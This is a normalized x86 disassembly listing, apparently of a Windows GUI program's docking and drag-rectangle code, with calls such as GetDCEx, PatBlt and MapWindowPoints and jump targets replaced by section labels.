call sub_443c3c
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x5
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x3
mov eax [ ebx ]
add eax 0x2
call sub_443c94
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x8
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x6
mov eax [ ebx ]
add eax 0x2
call sub_443c94
pop ecx
push ebp
mov edx [ ebx + 0x4 ]
inc edx
mov eax [ ebx ]
inc eax
call sub_443c3c
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x5
add eax 0x3
call sub_443c94
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x8
add eax 0x6
call sub_443c94
pop ecx
jmp r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_443df8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d544
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_443f4e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_438f28
mov eax [ ebp - 0x4 ]
call sub_41d848
xor eax eax
push ebp
push sub_443f31
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41dbbc
xor eax eax
push ebp
push sub_443f14
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x14 ]
call sub_43d858
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443f1b
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41dbbc
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
mov eax [ ebx + 0xa0 ]
cmp eax [ esi + 0x14 ]
jne r-xdata
mov eax [ esi + 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_43d81c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_439cec
lea ecx [ ebp - 0x1c ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x1c ]
sub eax [ ebx + 0x40 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebx + 0x44 ]
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ ebx + 0x48 ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
mov eax [ ebx + 0x4c ]
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
sub eax edx
add eax eax
sub [ ebp - 0x10 ] eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_443f5c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx ecx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_43f658
mov edi eax
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
call sub_439d94
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x14 ]
call sub_439d50
mov ecx eax
xor edx edx
xor eax eax
call sub_412938
mov eax [ ebp + 0x8 ]
push esi
push edi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
test edi edi
jle r-xdata
cmp [ ebx + 0x9c ] 0x0
je r-xdata
push 0x2
mov eax [ ebp + 0x8 ]
push eax
push 0x0
mov eax [ esi + 0x14 ]
call sub_440b28
push eax
call MapWindowPoints
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov al [ ebp + 0xc ]
dec al
je r-xdata
cmp edi 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x48 ]
mov edi eax
mov edx [ ebx + 0x4c ]
mov [ ebp - 0xc ] edx
mov dl [ ebp + 0xc ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
dec eax
sub al 0x2
jae r-xdata
mov edi eax
sar edi 0x1
jns r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
sub al 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
sar eax 0x1
jns r-xdata
adc edi 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
sub al 0x2
jne r-xdata
mov [ ebp - 0xc ] eax
adc eax 0x0
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_412960
mov eax [ ebp + 0x8 ]
push esi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
add [ ebp - 0x4 ] edi
jmp r-xdata
sub_4440d0
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_4440d0
pop ecx
mov eax ebx
call sub_403104
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_4440d0
pop ecx
sub_444104
push ebp
mov ebp esp
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
je r-xdata
push ebp
call sub_4440d0
pop ecx
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
cmp ebx [ esi + 0x64 ]
jne r-xdata
mov edx [ ebx + 0x18 ]
mov [ eax + 0x18 ] edx
mov eax ebx
call sub_403104
xor eax eax
mov [ esi + 0x64 ] eax
sub_444160
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_443170
test eax eax
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x38 ]
jne r-xdata
mov edx eax
mov eax ebx
call sub_44419c
xor edx edx
mov [ eax + 0x4 ] edx
jmp r-xdata
mov [ esi + 0x9c ] 0x0
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
sub_44419c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_444409
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059b8
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_4059b8
mov edx [ ebp - 0x8 ]
pop eax
call sub_40411c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b520
call sub_403890
mov eax [ ebx + 0x14 ]
call sub_4428fc
cmp eax 0x1
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_4059b8
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_4059b8
mov edx [ ebp - 0x10 ]
pop eax
call sub_40411c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b520
call sub_403890
cmp eax 0x2
jne r-xdata
mov eax [ esi + 0x64 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0x10 ] 0x0
jmp r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax ebx
call sub_403104
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444410
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403e78
retn
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ ebx + 0xc ]
test edx edx
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
mov eax [ ebx + 0xc ]
xor edx edx
mov [ eax + 0x18 ] edx
call sub_442cac
jmp r-xdata
mov edi eax
mov edi [ ebx + 0xc ]
jmp r-xdata
mov eax ebx
call sub_442e24
mov edx eax
mov eax [ ebx + 0x18 ]
call sub_442e60
mov eax [ ebx + 0x18 ]
call sub_442cac
mov [ edx + 0x18 ] eax
push esi
push sub_4449ac
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_4431d8
mov eax [ ebx + 0x14 ]
cmp eax [ esi + 0x64 ]
jne r-xdata
mov edx [ esi + 0x64 ]
mov eax [ ebx + 0x14 ]
cmp edx eax
jne r-xdata
cmp [ edi + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov eax [ eax + 0x18 ]
mov edx [ edi + 0x8 ]
mov [ edx + 0x18 ] eax
test eax eax
jne r-xdata
mov edx [ esi + 0x68 ]
mov eax edi
call sub_442e60
mov eax [ esi + 0x64 ]
call sub_442e24
mov [ esi + 0x68 ] eax
mov eax [ esi + 0x64 ]
call sub_403104
mov [ esi + 0x64 ] edi
xor eax eax
mov [ edi + 0xc ] eax
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0x14 ] eax
mov eax esi
call sub_444984
jmp r-xdata
mov [ eax + 0x10 ] 0x0
mov edx [ edi + 0x4 ]
mov [ eax + 0x4 ] edx
xor edx edx
mov [ eax + 0x8 ] edx
mov eax edi
call sub_403104
mov eax [ esi + 0x64 ]
mov [ eax + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ esi + 0x64 ]
call sub_4429a8
mov edx eax
mov eax edi
call sub_442e4c
mov eax edi
call sub_442cac
jmp r-xdata
mov edx [ edi + 0x8 ]
mov [ eax + 0xc ] edx
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
push esi
push sub_4449ac
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_4431d8
jmp r-xdata
mov eax [ eax + 0xc ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0xc ]
mov [ eax + 0xc ] edx
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
push esi
push sub_4449ac
mov edx [ eax + 0x14 ]
mov eax esi
call sub_4431d8
mov eax [ ebx + 0x14 ]
call sub_403104
mov eax edi
call sub_403104
jmp r-xdata
mov edx [ eax + 0xc ]
mov [ edx + 0x18 ] eax
sub_444418
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov edi eax
mov esi [ edi + 0x14 ]
test [ esi + 0x1c ] 0x1
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x64 ] 0x0
je r-xdata
mov eax esi
call sub_43f658
test eax eax
jle r-xdata
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
test bl bl
jne r-xdata
push edi
lea esi [ esp + 0x4 ]
add edi 0x1d
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ edi + 0x64 ]
mov dl [ eax + 0x10 ]
dec dl
je r-xdata
lea edx [ edi + 0x1d ]
mov eax esp
mov ecx 0x10
call sub_407ad0
test al al
jne r-xdata
mov edx [ esp + 0x8 ]
sub edx [ esp ]
call sub_442e4c
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x68 ] eax
jmp r-xdata
dec dl
je r-xdata
mov eax [ edi + 0x14 ]
call sub_43f5c4
test eax eax
jle r-xdata
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
call sub_442e4c
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ edi + 0x68 ] eax
jmp r-xdata
xor edx edx
mov eax edi
call sub_444834
cmp [ edi + 0x6c ] 0x0
jne r-xdata
push edi
push sub_4449ac
xor edx edx
mov eax edi
call sub_4431d8
sub_4444f4
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop edx
pop esi
pop ebx
retn
test ebx ebx
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_442e24
mov [ esp ] eax
fild [ esp ]
fmul [ esi + 0x40 ]
call sub_402910
mov edx eax
mov eax ebx
call sub_442e4c
sub_444530
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_404304
xor eax eax
push ebp
push sub_44459b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_404114
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4445a2
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_4445a8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_444657
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x1
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_442bb4
mov eax [ ebp - 0x8 ]
call sub_444530
pop ecx
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
inc edx
call sub_4445a8
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44465e
lea eax [ ebp - 0x8 ]
call sub_403e54
retn
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
call sub_4445a8
pop ecx
sub_444664
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44479d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x70 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44474c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_43f5c4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx [ ebp - 0xc ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444753
mov eax [ ebp - 0x10 ]
call sub_403104
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
push ebp
lea ecx [ ebp - 0x14 ]
mov edx esi
mov eax [ ebp - 0x10 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x14 ]
call sub_444530
pop ecx
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_43f5d8
mov edi eax
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov edx [ edi + 0x8 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_444753
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
xor edx edx
call sub_4445a8
pop ecx
mov edx rw-data
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4447a4
lea eax [ ebp - 0x14 ]
call sub_403e54
retn
sub_4447ac
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_442efc
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_442f24
call sub_4447ac
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_442efc
call sub_4447ac
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov eax ebx
call sub_44292c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x64 ]
mov esi [ ebx + 0x14 ]
cmp eax esi
jne r-xdata
mov eax [ esi + 0x14 ]
call sub_442e24
mov edx eax
mov eax ebx
call sub_442e4c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_442e4c
jmp r-xdata
sub_444834
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
test edx edx
jne r-xdata
push ebp
mov eax edx
call sub_4447ac
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx [ eax + 0x8 ]
sub_444878
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
cmp ebx [ esi + 0x64 ]
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_442e24
mov edx eax
add edx [ esi + 0x4c ]
mov eax ebx
call sub_442e4c
sub_4448a8
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov [ ebx + 0x60 ] edx
mov eax [ ebx + 0x14 ]
call sub_440b28
mov edx eax
mov eax [ rw-data ]
call sub_445408
mov eax [ ebx + 0x14 ]
call sub_440b28
mov esi eax
mov [ ebx + 0x5c ] esi
push 0x412
push 0x0
push esi
call GetDCEx
mov [ ebx + 0x58 ] eax
mov eax [ esp ]
mov [ ebx + 0x50 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x54 ] eax
mov eax ebx
call sub_4449bc
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_444908
push ebx
mov ebx eax
xor edx edx
mov eax [ rw-data ]
call sub_445408
mov eax ebx
call sub_4449bc
mov eax [ ebx + 0x58 ]
push eax
mov eax [ ebx + 0x5c ]
push eax
call ReleaseDC
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
cmp [ edx + 0x10 ] 0x1
jne r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
add edx [ ebx + 0x50 ]
call sub_442e4c
adc edx 0x0
add edx [ ebx + 0x54 ]
call sub_442e4c
jmp r-xdata
adc edx 0x0
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_444834
push ebx
push sub_4449ac
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_4431d8
xor eax eax
mov [ ebx + 0x60 ] eax
pop ebx
retn
sub_444984
push ebx
mov ebx eax
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_43f5c4
test eax eax
jle r-xdata
push ebx
push sub_4449ac
xor edx edx
mov eax ebx
call sub_4431d8
sub_4449bc
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi [ ebx + 0x60 ]
test esi esi
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx 0x2
mov eax esi
call sub_4429f0
mov [ esp ] eax
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx [ ebx + 0x50 ]
sub edx eax
mov [ esp ] edx
mov edx 0x1
mov eax esi
call sub_4429f0
mov [ esp + 0x4 ] eax
mov eax [ esp ]
add eax [ ebx + 0xc ]
mov [ esp + 0x8 ] eax
mov edx 0x1
mov eax [ ebx + 0x60 ]
call sub_442a5c
add eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
adc eax 0x0
mov edx [ ebx + 0x54 ]
sub edx eax
mov [ esp + 0x4 ] edx
mov edx 0x2
mov eax [ ebx + 0x60 ]
call sub_442a5c
add eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
add eax [ ebx + 0xc ]
mov [ esp + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x10 ]
call sub_41d428
push eax
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
mov esi eax
push 0x5a0049
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x8 ]
sub ecx edx
push ecx
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x8 ]
sub ecx eax
push ecx
push edx
push eax
mov eax [ ebx + 0x58 ]
push eax
call PatBlt
push esi
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
sub_444aa8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x14 ]
cmp al [ edx + 0x10 ]
jne r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_444aa8
pop ecx
mov eax ebx
call sub_442e24
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_442e24
cmp edi eax
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_444aa8
pop ecx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_442e24
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4240b0
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
sub_444b38
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_442e24
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_4429a8
add esi eax
mov [ ebp - 0x8 ] esi
mov eax esi
call sub_442e24
mov [ ebp - 0x8 ] eax
jmp r-xdata
push ebp
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
call sub_444aa8
pop ecx
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_444b88
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov bl 0x4
test esi esi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_439cec
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_439cec
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x1c ]
jg r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x20 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jge r-xdata
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0x14 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jl r-xdata
cmp eax [ ebp - 0xc ]
jg r-xdata
adc eax 0x0
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jl r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x2
mov bl 0x3
jmp r-xdata
sub_444c04
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4428b4
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
mov eax ebx
call sub_442960
mov edx [ ebx + 0x20 ]
sub edx eax
mov [ ebx + 0x24 ] edx
jmp r-xdata
mov eax ebx
call sub_442f08
test eax eax
je r-xdata
mov eax esi
call sub_44292c
test al al
jne r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_4449ac
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx + 0x14 ]
call sub_4431d8
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_442f08
mov edx [ ebx + 0x20 ]
call sub_442e60
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x14 ]
